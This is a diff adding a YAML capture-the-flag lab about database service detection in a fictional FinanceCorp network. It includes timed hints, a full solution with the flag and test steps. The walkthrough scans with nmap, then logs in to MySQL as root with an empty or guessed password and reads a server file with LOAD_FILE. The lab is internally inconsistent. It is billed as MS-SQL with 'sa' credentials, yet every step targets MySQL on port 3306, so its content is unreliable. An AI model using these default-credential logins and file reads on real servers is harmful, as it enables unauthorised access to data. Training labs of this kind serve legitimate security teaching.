@@ -1,0 +1,405 @@
+name: MS-SQL Service Detection
+description: A database server has been identified in FinanceCorp's network. Test MS-SQL security, authentication, and potential for command execution.
+difficulty: intermediate
+category: enumeration
+duration_minutes: 120
+objectives:
+  - identify ms-sql service on target
+  - Understand Windows penetration testing techniques
+  - Capture the flag
+
+scenario: |
+  Your penetration test for FinanceCorp has identified a Microsoft SQL Server database 
+  on their network. James Mitchell is particularly concerned about database security, 
+  as databases often contain sensitive financial and customer information.
+  
+  MS-SQL servers are high-value targets for attackers, as they can provide access to 
+  sensitive data and potentially allow command execution on the underlying system. 
+  FinanceCorp wants to understand if their database server is properly secured.
+  
+  Your objective: Identify and assess FinanceCorp's MS-SQL database server. Begin by 
+  detecting the service on the network and gathering initial information about 
+  availability and configuration.
+
+flag: "OCR{mssql_d3t3ct}"
+
+hints:
+  - id: 1
+    unlock_after_minutes: 0
+    text: |
+      ## Understanding Database Service Detection
+
+      In penetration testing, **service detection** is one of the first steps in the
+      reconnaissance phase. Before you can attack or assess a database server, you
+      need to confirm that it exists on the network and identify what service is
+      running on which port.
+
+      ### Why Service Detection Matters
+
+      Database servers are high-value targets because they often contain:
+
+      - **Customer data** (names, emails, financial records)
+      - **Authentication credentials** (usernames, password hashes)
+      - **Business-critical information** (transactions, reports)
+      - **Configuration data** that reveals internal architecture
+
+      ### Common Database Ports
+
+      Different database services listen on well-known default ports:
+
+      | Database   | Default Port |
+      |------------|-------------|
+      | MySQL      | 3306        |
+      | MSSQL      | 1433        |
+      | PostgreSQL | 5432        |
+      | Oracle     | 1521        |
+      | MongoDB    | 27017       |
+
+      In this lab, the target database server is running on its default port.
+      Your first task is to identify the service and confirm it is accessible
+      from your position on the network.
+
+      ### Key Concept: Port Scanning
+
+      Port scanning sends specially crafted packets to target ports and analyzes
+      the responses to determine:
+
+      1. Whether a port is **open** (accepting connections)
+      2. What **service** is running on that port
+      3. What **version** of the service is installed
+
+      Start by thinking about which tool is best suited for network service
+      detection in a penetration testing context.
+
+  - id: 2
+    unlock_after_minutes: 5
+    text: |
+      ## Introduction to Nmap for Service Detection
+
+      **Nmap** (Network Mapper) is the industry-standard tool for network
+      discovery and service detection. It is pre-installed on most penetration
+      testing distributions like Kali Linux.
+
+      ### Basic Nmap Syntax
+
+      ```bash
+      nmap [scan type] [options] <target>
+      ```
+
+      ### Key Scan Types
+
+      | Flag   | Description                        |
+      |--------|------------------------------------|
+      | `-sS`  | TCP SYN scan (stealth scan)        |
+      | `-sT`  | TCP connect scan (full handshake)  |
+      | `-sV`  | Version detection scan             |
+      | `-sC`  | Script scan (default scripts)      |
+      | `-sn`  | Ping scan (host discovery only)    |
+
+      ### Important Options
+
+      | Option        | Description                          |
+      |---------------|--------------------------------------|
+      | `-p <ports>`  | Specify ports to scan                |
+      | `-p-`         | Scan all 65535 ports                 |
+      | `-A`          | Aggressive scan (OS + version + scripts) |
+      | `-v`          | Verbose output                       |
+      | `--open`      | Show only open ports                 |
+
+      ### Service Version Detection
+
+      The `-sV` flag is critical for this lab. It probes open ports to
+      determine what service and version is running:
+
+      ```bash
+      nmap -sV <target>
+      ```
+
+      This sends protocol-specific probes and matches responses against
+      nmap's database of known service signatures.
+
+      Think about which port you should focus on for a database service.
+
+  - id: 3
+    unlock_after_minutes: 10
+    text: |
+      ## Practical Service Detection Examples
+
+      ### Scanning Specific Ports
+
+      Rather than scanning all 65535 ports (which takes time), you can target
+      the specific port you expect a database to be running on:
+
+      ```bash
+      # Scan a single port
+      nmap -sV -p 3306 <target>
+
+      # Scan multiple database ports
+      nmap -sV -p 1433,3306,5432,1521 <target>
+
+      # Scan a range of ports
+      nmap -sV -p 1-10000 <target>
+      ```
+
+      ### Understanding Nmap Output
+
+      When nmap detects a service, the output looks like this:
+
+      ```
+      PORT     STATE SERVICE VERSION
+      3306/tcp open  mysql   MySQL 5.7.x
+      ```
+
+      The output columns tell you:
+      - **PORT**: The port number and protocol
+      - **STATE**: Whether the port is open, closed, or filtered
+      - **SERVICE**: The identified service name
+      - **VERSION**: The detected version string
+
+      ### Port States Explained
+
+      | State      | Meaning                                    |
+      |------------|--------------------------------------------|
+      | `open`     | Port is accepting connections               |
+      | `closed`   | Port is accessible but no service listening |
+      | `filtered` | Firewall is blocking the probe             |
+
+      ### Combining Flags for Better Results
+
+      For more thorough detection, combine flags:
+
+      ```bash
+      # Version detection with verbose output
+      nmap -sV -v -p 3306 <target>
+
+      # Version detection with default scripts
+      nmap -sV -sC -p 3306 <target>
+      ```
+
+      The database in this lab runs on port **3306**, which is the default
+      MySQL port. Focus your scan there.
+
+  - id: 4
+    unlock_after_minutes: 15
+    text: |
+      ## Step-by-Step Workflow for This Lab
+
+      Follow these steps to complete the service detection lab:
+
+      ### Step 1: Identify Your Target
+
+      Your target is the database server in the lab environment. You should
+      know the target IP address from your lab assignment (it will be on
+      your isolated network).
+
+      ### Step 2: Perform Initial Port Discovery
+
+      Start with a quick scan to see if the database port is open:
+
+      ```bash
+      nmap -p 3306 <target>
+      ```
+
+      This confirms whether port 3306 is open before doing deeper probing.
+
+      ### Step 3: Perform Service Version Detection
+
+      Once you confirm the port is open, perform version detection:
+
+      ```bash
+      nmap -sV -p 3306 <target>
+      ```
+
+      This will identify the exact service running on port 3306.
+
+      ### Step 4: Gather Additional Information
+
+      For a more comprehensive scan, use default scripts:
+
+      ```bash
+      nmap -sV -sC -p 3306 <target>
+      ```
+
+      The `-sC` flag runs nmap's default scripts, which can reveal
+      additional information about the database service.
+
+      ### Step 5: Document Findings
+
+      Record the following from your scan results:
+      - Service name (e.g., mysql)
+      - Version number
+      - Any additional information from scripts
+
+      ### Step 6: Retrieve the Flag
+
+      After successfully detecting the service, retrieve the flag file
+      from the target system. The flag is stored at `/tmp/flag.txt` on
+      the database server.
+
+      Think about how you might access a file on the target once you
+      have confirmed the service is running.
+
+  - id: 5
+    unlock_after_minutes: 20
+    text: |
+      ## Exact Commands for Service Detection
+
+      ### Primary Detection Command
+
+      Run this nmap command against your target:
+
+      ```bash
+      nmap -sV -p 3306 <target>
+      ```
+
+      Replace `<target>` with the actual IP address of the database server
+      in your lab environment.
+
+      ### Enhanced Detection with Scripts
+
+      For more detailed output:
+
+      ```bash
+      nmap -sV -sC -p 3306 <target>
+      ```
+
+      ### Full Port Scan Alternative
+
+      If you want to discover the service without knowing the port:
+
+      ```bash
+      nmap -sV -p- <target>
+      ```
+
+      **Note:** A full port scan takes significantly longer but will find
+      services running on non-standard ports.
+
+      ### Quick Aggressive Scan
+
+      For maximum information in one command:
+
+      ```bash
+      nmap -A -p 3306 <target>
+      ```
+
+      The `-A` flag enables OS detection, version detection, script
+      scanning, and traceroute all at once.
+
+      ### Retrieving the Flag
+
+      The flag for this lab is located at `/tmp/flag.txt` on the target.
+      Once you have confirmed the database service is running, you need
+      to find a way to read that file. Consider:
+
+      - Can you connect to the database service?
+      - Are there any default or weak credentials?
+      - Can the database read local files?
+
+      For this initial detection lab, try connecting to the MySQL service
+      and using its file-reading capabilities:
+
+      ```bash
+      mysql --ssl-verify-server-cert=0 -u root --password="" -h <target> -e "SELECT LOAD_FILE('/tmp/flag.txt');"
+      ```
+
+  - id: 6
+    unlock_after_minutes: 25
+    text: |
+      ## Complete Solution Walkthrough
+
+      ### Step 1: Run Service Detection Scan
+
+      ```bash
+      nmap -sV -p 3306 <target>
+      ```
+
+      **Expected Output:**
+      ```
+      Starting Nmap 7.94 ( https://nmap.org )
+      Nmap scan report for <target>
+      Host is up (0.001s latency).
+
+      PORT     STATE SERVICE VERSION
+      3306/tcp open  mysql   MySQL 5.5.5-10.x.x-MariaDB
+
+      Service detection performed.
+      Nmap done: 1 IP address (1 host up) scanned in 1.23 seconds
+      ```
+
+      This confirms a MySQL database service is running on port 3306.
+
+      ### Step 2: Run Script Scan for More Details
+
+      ```bash
+      nmap -sV -sC -p 3306 <target>
+      ```
+
+      **Expected Output:**
+      ```
+      PORT     STATE SERVICE VERSION
+      3306/tcp open  mysql   MySQL 5.5.5-10.x.x-MariaDB
+      | mysql-info:
+      |   Protocol: 10
+      |   Version: 5.5.5-10.x.x-MariaDB
+      |   Thread ID: 3
+      |   Capabilities flags: 63486
+      |   Some Coverage flags: ...
+      |   Status: Autocommit
+      |_  Salt: ...
+      ```
+
+      ### Step 3: Retrieve the Flag
+
+      Connect to the MySQL service and read the flag file:
+
+      ```bash
+      mysql --ssl-verify-server-cert=0 -u root --password="" -h <target> -e "SELECT LOAD_FILE('/tmp/flag.txt');"
+      ```
+
+      If root with no password does not work, try other common credentials.
+      You can also attempt:
+
+      ```bash
+      mysql --ssl-verify-server-cert=0 -u root -h <target> -e "SELECT LOAD_FILE('/tmp/flag.txt');"
+      ```
+
+      **Expected Output:**
+      ```
+      +---------------------------------------------------+
+      | LOAD_FILE('/tmp/flag.txt')                         |
+      +---------------------------------------------------+
+      | OCR{...}                                         |
+      +---------------------------------------------------+
+      ```
+
+      ### Key Takeaways
+
+      - **Nmap** with `-sV` is the standard tool for service detection
+      - Database services on default ports are easily discoverable
+      - Port 3306 indicates a MySQL/MariaDB service
+      - Service detection is the first step in database penetration testing
+      - Always document service versions for vulnerability research
+
+      Submit the flag value you retrieved to complete this lab.
+
+credentials:
+  - username: "sa"
+    password: "password"
+    role: "sa"
+    description: "sa credentials"
+
+workbook: "wiki/range/winpt/CH06_MSSQL_Exploitation/01_MSSQL_Service_Detection/"
+
+test:
+  steps:
+    - name: "Verify MySQL port 3306 is open"
+      command: "nmap -Pn -p 3306 {target.target} | grep '3306/tcp'"
+      expect: "open"
+
+    - name: "Detect MySQL service version"
+      command: "nmap -Pn -sV -p 3306 {target.target} | grep '3306/tcp'"
+      expect: "mysql"
+
+    - name: "Query flag from database"
+      command: "mysql --ssl-verify-server-cert=0 -h {target.target} -u {cred.sa.user} -p{cred.sa.pass} -N -e 'SELECT content FROM target_db.secrets LIMIT 1' 2>&1"
+      expect: "OCR{"
